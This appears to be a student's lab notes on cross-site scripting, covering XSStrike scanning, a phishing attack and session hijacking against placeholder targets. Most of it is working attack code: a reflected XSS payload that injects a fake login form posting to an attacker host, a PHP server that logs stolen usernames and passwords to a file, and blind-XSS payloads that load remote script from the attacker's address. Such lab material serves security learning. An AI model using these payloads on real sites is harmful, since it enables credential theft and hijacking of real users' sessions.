```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py

# Functionality
# -u being URL, Task being the box to type anything into.
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

# For the Test there were 4 boxes (Fullname, Username, Password and Email)
python xsstrike.py -u "http://ip:port/?fullname=test&username=test&password=test&email=test.com"

# Upon launching the command it come back with a hit on the email portion of the page.
```

# Phishing
Going to the URL
```html
# Going to...
http://ip:port/login.php?url=
'><script>document.write('<h3>Please login to continue</h3><form action=http://YOURIP:PORT/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--

Then setting up a tmp server on our side.
```
```php
# nano index.php
<?php  
if (isset($_GET['username']) && isset($_GET['password'])) {  
$file = fopen("creds.txt", "a+");  
fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");  
header("Location: http://SERVER_IP/phishing/index.php");  
fclose($file);  
exit();  
}  
?>

# sudo php -S 0.0.0.0:8080
# Anyone logging into the web page will have the credentials stashed is the creds.txt file.
```

# Session Hijacking
Going to the `http://IP:port/hijacking/index.php`
```html
<script src="http://OUR_IP/script.js"></script>

<script src="http://OUR_IP/username"></script>


<script src=http://OUR_IP></script> '><script src=http://OUR_IP></script> "><script src=http://OUR_IP></script> javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)') <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script> <script>$.getScript("http://OUR_IP")</script>

# And we can server this in an php server
```

# Resources
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
